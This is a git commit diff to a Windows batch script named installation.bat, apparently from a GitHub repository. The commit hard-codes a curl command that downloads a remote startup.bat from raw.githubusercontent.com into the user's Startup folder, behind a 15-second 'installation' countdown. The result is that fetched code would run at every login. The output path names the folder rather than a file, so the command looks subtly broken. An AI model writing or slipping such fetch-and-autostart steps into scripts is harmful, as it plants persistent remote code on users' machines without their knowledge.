17bbee3c1624e104599dfc364bceff65616d16b2
_Eckermania <127853724+Eckermania514@users.noreply.github.com>
2026-01-20 09:17:52 -0500

    Update curl command to fetch startup.bat from GitHub

--- installation.bat
+++ installation.bat
@@ -2,4 +2,4 @@
 color 02
 echo Installation will begin in 15 seconds. Press any key to skip
 timeout /t 15 > nul
-curl %URL% -o "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+curl https://raw.githubusercontent.com/Eckermania514/closerl/refs/heads/main/startup.bat -o "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
